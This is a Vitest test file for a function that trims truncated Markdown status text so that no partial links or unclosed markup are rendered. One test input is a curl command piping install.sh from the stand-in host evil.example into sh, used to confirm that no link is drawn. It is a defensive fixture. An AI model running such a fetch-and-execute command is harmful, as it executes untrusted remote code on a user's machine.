// @vitest-environment jsdom
// The trim of a truncated status line head (issue 514), rule by rule: the
// exact head each rule leaves, and the premises about `marked` it stands on.
// The oracle test judges the same module by what the renderers draw.
import { Lexer } from "marked";
import { afterEach, describe, expect, it, vi } from "vitest";
import { trimIncompleteMarkdown } from "../src/lib/truncatedMarkdown";
import { renderUntrustedMarkdown, untrustedMarked } from "../src/lib/untrustedMarkdown";
import { SYNTHETIC, graphemeEnds } from "./truncatedMarkdownOracle";

afterEach(() => {
  vi.restoreAllMocks();
});

/** The trim, with a count of how often it fell back. */
function trim(head: string): { shown: string; fallbacks: number } {
  let fallbacks = 0;
  const shown = trimIncompleteMarkdown(head, () => (fallbacks += 1));
  return { shown, fallbacks };
}

const hasLink = (markdown: string): boolean => {
  const rendered = renderUntrustedMarkdown(markdown);
  return rendered.kind === "html" && rendered.html.includes("<a ");
};

describe("a block marker or rule still being typed", () => {
  it.each([
    ["a quote marker", "本文の段落\n>", "本文の段落\n"],
    ["a bullet", "本文の段落\n-", "本文の段落\n"],
    ["a number", "本文の段落\n1.", "本文の段落\n"],
    ["a heading mark", "本文の段落\n\n#", "本文の段落\n\n"],
    ["a fence of two backticks", "本文の段落\n\n``", "本文の段落\n\n"],
    ["a table pipe", "本文の段落\n|", "本文の段落\n"],
    ["a rule that may underline the line above", "本文の段落\n---", "本文の段落\n"],
    ["a setext underline", "本文の段落\n===", "本文の段落\n"],
    ["a bullet inside a list", "- 項目\n-", "- 項目\n"],
    ["a quote marker inside a quote", "> 引用\n>", "> 引用\n"],
    ["a nested bullet", "- 項\n  - ", "- 項\n"],
  ])("drops %s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });

  // Every trailing marker line goes in one step, so a long run is not a long
  // chain of steps; the result is final.
  it.each([
    ["quote markers", "本文の段落\n" + ">\n".repeat(10) + ">", "本文の段落\n"],
    ["bullets", "本文の段落\n" + "-\n".repeat(10) + "-", "本文の段落\n"],
    ["fence runs", "本文の段落\n\n" + "```\n".repeat(10) + "`", "本文の段落\n\n" + "```\n".repeat(10)],
    ["a long run of quote markers", "本文の段落\n" + ">\n".repeat(400) + ">", "本文の段落\n"],
  ])("ends on %s without the fallback and is final", (_name, head, shown) => {
    const result = trim(head);

    expect(result).toEqual({ shown, fallbacks: 0 });
    expect(trim(result.shown)).toEqual({ shown, fallbacks: 0 });
  });
});

describe("a table, a fence, a definition", () => {
  it.each([
    ["a table is dropped whole", "前文\n\n| a | b |\n|---|---|\n| c |", "前文\n\n"],
    ["a table header alone", "前文\n\n| a | b |\n|", "前文\n\n"],
    ["a table delimiter row being typed", "前文\n\n| a | b |\n|--", "前文\n\n"],
    ["a closed fence stays", "前文\n\n```ts\nconst a = 1;\n```\n後", "前文\n\n```ts\nconst a = 1;\n```\n後"],
    ["an open fence with a body stays", "前文\n\n```ts\nconst a = 1;\n", "前文\n\n```ts\nconst a = 1;\n"],
    ["an open fence with a partial line stays", "前文\n\n```ts\nconst a", "前文\n\n```ts\nconst a"],
    ["a fence with no body goes", "前文\n\n```ts\n", "前文\n\n"],
    ["a lone fence run goes", "前文\n\n```", "前文\n\n"],
    ["an empty quote line goes", "> 引用\n> ", "> 引用\n"],
    // A blank line inside a fence is code, so the head is not complete there.
    ["a fence opener followed only by blank lines goes", "```\n\n", ""],
    ["so does one with an info string", "前文\n\n```ts\n\n", "前文\n\n"],
    ["a blank line inside a fence body stays", "前文\n\n```ts\ncode\n\n", "前文\n\n```ts\ncode\n\n"],
    ["a list item that holds only an empty bullet goes", "**状況**\n- *", "**状況**\n"],
    ["an ordered one too", "前文\n\n1. *", "前文\n\n"],
    ["an empty heading goes", "前文\n\n## ##", "前文\n\n"],
    ["an empty heading in a list item goes", "- ##", ""],
    // A closing run shorter than the opener is code until the rest of it arrives.
    ["a closing run shorter than the opener goes", "前文\n\n````ts\nconst a\n```", "前文\n\n````ts\nconst a\n"],
    ["so does a tilde run", "前文\n\n~~~~ts\nconst a\n~~~", "前文\n\n~~~~ts\nconst a\n"],
    ["a closing run as long as the opener ends the block", "前文\n\n````ts\nconst a\n````", "前文\n\n````ts\nconst a\n````"],
    ["a fence opener typed under a quote line goes", "> a\n> ~~~5", "> a\n"],
    ["a table delimiter row without pipes at its edge goes", "前文\n\na | b\n--|", "前文\n\n"],
    ["so does one that is the whole head", "a | b\n--|", ""],
  ])("%s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });

  it("drops a definition on the last line, so the reference does not link to a half address", () => {
    const head = "参照 [issue 514][i] を見る。\n\n[i]: https://gith";

    expect(trim(head)).toEqual({ shown: "参照 [issue 514][i] を見る。\n\n", fallbacks: 0 });
    expect(hasLink(head)).toBe(true);
    expect(hasLink(trim(head).shown)).toBe(false);
  });

  it.each([
    ["with its title being typed", '前置き\n\n[i]: https://example.com/x "ti', "前置き\n\n"],
    ["with a parenthesised title being typed", "[i]: https://example.com/x (ti", ""],
    ["with only its label", "前置き\n\n[i]:", "前置き\n\n"],
    ["with a space after its colon", "前置き\n\n[i]: ", "前置き\n\n"],
    // After a paragraph line the definition is paragraph text for the lexer,
    // in the full line as well, so nothing is pending.
    ["right under a paragraph line", '前置き\n[i]: https://example.com/x "ti', '前置き\n[i]: https://example.com/x "ti'],
  ])("a line that starts like a definition: %s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });
});

describe("a label defined twice", () => {
  // The lexer emits no token for the second definition, so the tokens' lengths
  // do not add up to the head: nothing after it may be lost, and a duplicate
  // at the end draws nothing and goes without a fallback.
  const A = "[i]: https://a.example/x";
  const B = "[i]: https://b.example/y";

  it.each([
    ["in the middle: the text after it stays", `${A}\n${B}\n\n本文 後`, `${A}\n${B}\n\n本文 後`],
    [
      "in the middle: the cut after it works",
      `${A}\n\n${B}\n\n本文 [x][i] **太字`,
      `${A}\n\n${B}\n\n本文 [x][i] `,
    ],
    ["at the end, with a newline: only definitions are left", `${A}\n${B}\n`, ""],
    ["at the end, without one", `${A}\n${B}`, ""],
    ["in a list item at the end", `- 項\n\n  ${A}\n\n  ${B}`, `- 項\n\n  ${A}\n\n`],
    ["a head of definitions only", `${A}\n[j]: https://b.example/y\n`, ""],
  ])("%s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });
});

describe("a delimiter that may still open or close", () => {
  it.each([
    ["a closed bold stays, the run after it goes", "前文 **太字**と**", "前文 **太字**と"],
    ["an emphasis being opened goes", "前文 *強調", "前文 "],
    ["an underscore emphasis being opened goes", "前文 _強調", "前文 "],
    ["a strike being opened goes", "前文 ~~消す", "前文 "],
    ["a code span being opened goes", "前文 `code", "前文 "],
    ["a closed bold, then an open one", "前文 **a** 後 **b", "前文 **a** 後 "],
    ["delimiters that cannot open stay", "snake_case_name と arr[0] と 2 * 3 と", "snake_case_name と arr[0] と 2 * 3 と"],
    ["a heading keeps its mark", "# 見出し **太字", "# 見出し "],
  ])("%s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });

  it.each([
    ["a trailing backslash", "前 \\", "前 "],
    ["a trailing bang", "前 !", "前 "],
    ["an entity prefix", "前 AT&amp", "前 AT"],
    ["an entity that may grow", "前 &c", "前 "],
    ["an entity that is complete", "前 &copy;", "前 &copy;"],
    ["a tag being opened", "前 <b", "前 "],
    ["a lone angle bracket", "前 <", "前 "],
    ["an angle bracket before a space", "前 a < b", "前 a < b"],
  ])("%s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });
});

describe("an address that touches the end of the head", () => {
  // The rest of an address is unknown: it is cut, never unwrapped, and no
  // link to the part that is there may remain.
  it.each([
    ["a bare URL", "参照 https://github.com/sakuraiyuta/kaoiro/issu", "参照 "],
    ["a bare URL alone", "https://github.com/sakuraiyuta/kaoiro/issu", ""],
    ["a www address", "see www.example.com/abc", "see "],
    ["an email address", "mail foo@example.com", "mail "],
    ["an angle autolink", "前 <https://example.com/abc", "前 "],
    ["a link destination", "前 [リンク](https://exa", "前 "],
    ["a link destination with a parenthesis", "前 [リンク](https://e.example/a_(b)_c", "前 "],
    ["a closed link whose destination holds a parenthesis", "前 [a](https://example.com/a_(b)_c)", "前 "],
    ["a link label that is not closed", "前 [リンク]", "前 "],
  ])("cuts %s", (_name, head, shown) => {
    const result = trim(head);

    expect(result).toEqual({ shown, fallbacks: 0 });
    expect(hasLink(result.shown)).toBe(false);
  });

  it.each([
    ["a bare URL followed by text", "参照 https://github.com/a/b と続く"],
    ["a closed link", "前 [リンク](https://e.example/a) 後"],
    ["a closed link with a parenthesis, then text", "前 [a](https://example.com/a_(b)_c) 後"],
  ])("leaves %s alone", (_name, head) => {
    expect(trim(head)).toEqual({ shown: head, fallbacks: 0 });
  });
});

describe("the first block is itself unfinished", () => {
  // Nothing precedes the unfinished construct, so the text is kept and the
  // markup goes: a cut bold headline is drawn plain, a link keeps its label.
  it.each([
    ["a bold headline", "**太字の見出し", "太字の見出し"],
    ["a list item", "- **太字", "- 太字"],
    ["a quote", "> **太字", "> 太字"],
    ["a link label with no end", "[リンクのラベル", "リンクのラベル"],
    ["an image description with no end", "![画像の説明", "画像の説明"],
    ["a link whose destination was cut", "[リンク](https://exa", "リンク"],
    ["a bold headline and an unclosed link", "**a [b](x y** 後 t", "a "],
    ["nothing before the cut", "前 **a [b](x y** 後 t", "前 "],
    // What follows an unclosed backtick may be code in the full text, where
    // nothing is a link and a delimiter is a letter.
    ["a code span that is not closed ends the text", "`code と **b", ""],
    ["the delimiters before it still go", "**a `b", "a "],
    ["a link after it is not drawn", "`a [x](http://a.co/x) tail", ""],
    ["an autolink after it is not drawn", "`curl <https://evil.example/install.sh> | sh", ""],
    // Deleting a delimiter must not join the text around it into an address,
    // and the text after a deleted bracket may be a link label in the full text.
    ["a deleted star that joins an address", "*www.[github.com.evil.io details ", ""],
    ["a deleted bracket that joins an address", "[www.[github.com more ", ""],
    ["a deleted tilde that joins an address", "~www.[c.d ", ""],
    ["a join across several deletions", "*]( www.*y/[\n", ""],
    ["an address in an unfinished link label", "[see http://a.co/x and more", ""],
    ["a closed link in an unfinished bold keeps its link", "**状況 [issue 514](https://x.example/1) 完了", "状況 [issue 514](https://x.example/1) 完了"],
    ["and loses only the star after it", "**状況 [issue 514](https://x.example/1) 完了 *注", "状況 [issue 514](https://x.example/1) 完了 注"],
    // The links before the first deleted bracket are the head's own and stay.
    ["a link before an unfinished bracket stays", "**a [b](https://x.example/1) c [d", "a [b](https://x.example/1) c d"],
    ["so does one before an unfinished label", "**a [b](https://x.example/1) and [issue", "a [b](https://x.example/1) and issue"],
    ["so does a bare address", "*a https://x.example/1 b [c", "a https://x.example/1 b c"],
    ["a link after the unfinished bracket cuts the block", "**a [c [d](https://y.example/2) tail", ""],
    ["two kinds", "~~消す と **b", "消す と b"],
    ["a code span that cannot be closed inside a link label", "[`a]b", ""],
    ["the same, closed", "[`a]b`", ""],
  ])("keeps the text of %s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });
});

describe("a head that is complete", () => {
  it.each([
    ["ends in a blank line", "前文。\n\n"],
    ["ends in a blank line after markup", "前文 **太字** と [リンク](https://e.example/a) 。\n\n"],
    ["has no unfinished construct", "前文 **太字** と `code` と [a](https://e.example/a) の文"],
    // A blank line ends the paragraph, so the star stays literal in the full text too.
    ["ends a paragraph in a blank line, with a delimiter still open", "前文 **a\n\n"],
  ])("is left as it is when it %s", (_name, head) => {
    expect(trim(head)).toEqual({ shown: head, fallbacks: 0 });
  });

  // The head's own characters come back: a tab is read by the lexer alone.
  it.each([
    ["a tab in a paragraph", "a\t**b", "a\t"],
    ["a tab in a quote", "> a\t**b", "> a\t"],
    ["a tab in a heading", "# a\t**b", "# a\t"],
    ["a tab after a bullet", "- \tcode **b", "- \tcode "],
    ["a tab after a number", "1. \tx **y", "1. \tx "],
    ["a lazy continuation line", "- a\nb\t**c", "- a\nb\t"],
  ])("keeps the tab of %s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
  });

  // The lexer rewrites the tabs of a list item (to the next tab stop on its first
  // line, to four spaces on a continuation line), so its text for the line is
  // not the tail of the head's line and the line cannot be mapped.
  it.each([
    ["a tab in a list item", "- a\t**b", ""],
    ["a tab in an ordered item", "1. a\t**b", ""],
    ["two tabs in a list item", "- a\t\t**b", ""],
    ["a tab before an address in an item", "- x\thttp://a.com/b", ""],
    ["a tab in a quoted item", "> - a\t**b", ""],
    ["a tab on a continuation line", "- a\n  b\t**c", "- a\n"],
    ["a tab at the start of a continuation line", "- a\n\tb **c", "- a\n"],
    ["a tab in an item after a paragraph", "x\n\n- a\t**b", "x\n\n"],
  ])("cuts back to the line before %s", (_name, head, shown) => {
    expect(trim(head)).toEqual({ shown, fallbacks: 1 });
  });

  // A heading's closing hashes are the one thing besides a rewritten tab that
  // makes the lexer's text differ from the line, and a tab next to them breaks
  // the search for the text in the line.
  it.each([
    ["**-   # # > - \t# ", ""],
    [">\t**# \t[x](http://e.co/a) **# ", ""],
    ["**# 1. - \t- # http://e.co/b", ""],
  ])("does not search a heading with a tab for its text: %j", (head, shown) => {
    const result = trim(head);

    expect(result.shown).toBe(shown);
    expect(result.fallbacks).toBeGreaterThan(0);
  });

  // The lexer reads a tab after `>` as the end of the quote marker, so what
  // follows is indented code, where an address is not a link. Reading the tab as
  // two spaces would draw a paragraph with a link.
  it("leaves code in a quote alone", () => {
    const head = "> \thttps://example.com/complete-url-here\n";

    expect(trim(head)).toEqual({ shown: head, fallbacks: 0 });
    expect(hasLink(head)).toBe(false);
  });

  it("gives carriage returns the lexer's reading", () => {
    expect(trim("前 **太字\r\n続").shown).toBe("前 ");
    expect(trim("前\r\n\r\n").shown).toBe("前\n\n");
    for (const doc of SYNTHETIC) {
      for (const end of graphemeEnds(doc)) {
        const head = doc.slice(0, end);
        expect(trim(head.replace(/\n/g, "\r\n")).shown, JSON.stringify(head)).toBe(trim(head).shown);
      }
    }
  });
});

describe("a cut never lands inside a character", () => {
  const family = SYNTHETIC.find((doc) => doc.includes("👨‍👩‍👧‍👦"))!;
  const plain = (text: string): string => text.replace(/[*_~`[\]!<\\&]/g, "");

  it("keeps whole graphemes and a start of the text, once the markup is ignored", () => {
    for (const end of graphemeEnds(family)) {
      const head = family.slice(0, end);
      const shown = trim(head).shown;
      expect(shown, JSON.stringify(head)).not.toMatch(
        /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/,
      );
      expect(plain(head).startsWith(plain(shown))).toBe(true);
      expect(["", ...graphemeEnds(plain(head)).map(String)]).toContain(
        shown === "" ? "" : String(plain(shown).length),
      );
    }
  });
});

// Each of these made the old marker pattern try 2^n ways to match a line that
// does not match. The wall clock cannot interrupt a regex, so the bound is only
// for a reader; the proof is that the test ends at all.
describe("a head built to make a pattern backtrack", () => {
  it.each([
    ["nested quotes with one space", "> ".repeat(60) + "x".repeat(450)],
    ["nested quotes with two spaces after a line", "status\n" + ">  ".repeat(30) + "tail"],
    ["nested quotes ending in text", "> ".repeat(40) + "x"],
    ["bullets ending in text", "- ".repeat(200) + "x"],
    ["rule characters ending in text", "-".repeat(500) + "x"],
    ["mixed markers ending in text", "> - > 1. ".repeat(50) + "x"],
    ["fence characters ending in text", "`".repeat(300) + "x"],
  ])("%s", (_name, head) => {
    const started = performance.now();
    const result = trim(head);

    expect(performance.now() - started).toBeLessThan(2000);
    expect(result.fallbacks).toBe(0);
  });
});

// One character per step would lex the head once per character: 512 lexes for
// 512 exclamation marks (about 230 ms). The run goes in one step.
describe("a head that ends in a long run", () => {
  it.each([
    ["exclamation marks", "!".repeat(512), ""],
    ["exclamation marks after a letter", "a" + "!".repeat(511), "a"],
    ["backslashes", "\\".repeat(500), ""],
    ["both in one run", "a" + "!\\".repeat(200), "a"],
  ])("trims %s in a few lexes", (_name, head, shown) => {
    const lexer = vi.spyOn(untrustedMarked, "lexer");

    expect(trim(head)).toEqual({ shown, fallbacks: 0 });
    expect(lexer.mock.calls.length).toBeLessThan(10);
  });
});

describe("a lexer that does not agree with the head", () => {
  const head = "前文\n続き **a";

  it("cuts back to the previous line and says so when the last block is not the tail of the head", () => {
    // The text of the block is the last line, so only the check on the end of
    // the head, not the line mapping, can see that the lexer lost the plot.
    vi.spyOn(untrustedMarked, "lexer").mockReturnValueOnce([
      { type: "paragraph", raw: "続き **a x", text: "続き **a", tokens: [] },
    ] as never);

    expect(trim(head)).toEqual({ shown: "前文\n", fallbacks: 1 });
  });

  it("cuts back to the previous line when the inline tokens do not add up to the text", () => {
    vi.spyOn(Lexer, "lexInline").mockReturnValueOnce([{ type: "text", raw: "x", text: "x" }] as never);

    expect(trim(head)).toEqual({ shown: "前文\n", fallbacks: 1 });
  });

  it("cuts back to the previous line when an emphasis token does not hold its own text", () => {
    vi.spyOn(Lexer, "lexInline").mockReturnValueOnce([
      { type: "text", raw: "前文\n続き ", text: "前文\n続き " },
      { type: "strong", raw: "**a", text: "a", tokens: [{ type: "text", raw: "zz", text: "zz" }] },
    ] as never);

    expect(trim(head)).toEqual({ shown: "前文\n", fallbacks: 1 });
  });

  it("shows nothing for a head that is not a string, instead of throwing into the view", () => {
    expect(trim(null as never)).toEqual({ shown: "", fallbacks: 1 });
  });

  // A head that is not trimmed could draw a link to a half address, so a failure
  // shows the empty-head sentence instead.
  it("shows nothing, and says so, when the lexer throws", () => {
    vi.spyOn(untrustedMarked, "lexer").mockImplementation(() => {
      throw new Error("lexer failure");
    });

    expect(trim(head)).toEqual({ shown: "", fallbacks: 1 });
  });
});

describe("what the trim reads of marked", () => {
  const lex = (text: string) => untrustedMarked.lexer(text) as unknown as Record<string, any>[];

  it("lexes with the options both renderers draw with", () => {
    expect(untrustedMarked.defaults).toMatchObject({ gfm: true, breaks: true, async: false });
  });

  it("gives a quote its content in tokens and a list its content in items", () => {
    const quote = lex("> a\n> b")[0]!;
    const list = lex("- a\n- b")[0]!;

    expect(quote.type).toBe("blockquote");
    expect(quote.tokens[0].type).toBe("paragraph");
    expect(list.type).toBe("list");
    expect(list.items.at(-1).tokens[0]).toMatchObject({ type: "text", text: "b" });
  });

  it("gives a paragraph and a heading their text and their inline tokens", () => {
    expect(lex("a **b**")[0]).toMatchObject({ type: "paragraph", text: "a **b**" });
    expect(lex("# h")[0]).toMatchObject({ type: "heading", text: "h" });
  });

  it("tells a fence from indented code, and a table from a paragraph", () => {
    expect(lex("```ts\na\n```")[0]).toMatchObject({ type: "code" });
    expect(lex("```ts\na\n```")[0]!.codeBlockStyle).toBeUndefined();
    expect(lex("    a")[0]).toMatchObject({ type: "code", codeBlockStyle: "indented" });
    expect(lex("| a |\n|---|\n| b |")[0]!.type).toBe("table");
  });

  it("gives every address an href: links, images, bare URLs, emails, definitions", () => {
    const inline = (text: string) =>
      Lexer.lexInline(text, untrustedMarked.defaults) as unknown as Record<string, any>[];

    expect(inline("[a](https://x.example/p)")[0]).toMatchObject({ type: "link", href: "https://x.example/p" });
    expect(inline("![a](https://x.example/p)")[0]).toMatchObject({ type: "image", href: "https://x.example/p" });
    const bare = inline("see https://x.example/p")[1]!;
    expect(bare).toMatchObject({ type: "link", href: "https://x.example/p", raw: "https://x.example/p" });
    expect(inline("mail a@x.example")[1]).toMatchObject({ type: "link" });
    expect(inline("<https://x.example/p>")[0]).toMatchObject({ type: "link", raw: "<https://x.example/p>" });
    expect(lex("[i]: https://x.example/p\n")[0]).toMatchObject({ type: "def", href: "https://x.example/p" });
  });

  it("emits no token for a second definition of a label, and glues its newline to the one before", () => {
    const tokens = lex("[i]: https://a.example/x\n[i]: https://b.example/y\n\n本文");

    expect(tokens.map((t) => t.type)).toEqual(["def", "space", "paragraph"]);
    expect(tokens.reduce((n, t) => n + t.raw.length, 0)).toBeLessThan(52);
  });

  it("exposes the patterns the opener test and the definition test read", () => {
    const { emStrongLDelim, delLDelim } = Lexer.rules.inline.breaks;

    expect(emStrongLDelim.exec("*a")?.slice(1, 5).some(Boolean)).toBe(true);
    expect(emStrongLDelim.exec("**a")?.slice(1, 5).some(Boolean)).toBe(true);
    expect(emStrongLDelim.exec("_a")?.slice(1, 5).some(Boolean)).toBe(true);
    expect(emStrongLDelim.exec("* a")?.slice(1, 5).some(Boolean) ?? false).toBe(false);
    expect(delLDelim.exec("~~a")).not.toBeNull();
    expect(delLDelim.exec("~~ a")).toBeNull();
    expect(Lexer.rules.block.gfm.def.exec("[i]: https://x.example/p")?.[0]).toBe("[i]: https://x.example/p");
  });
});
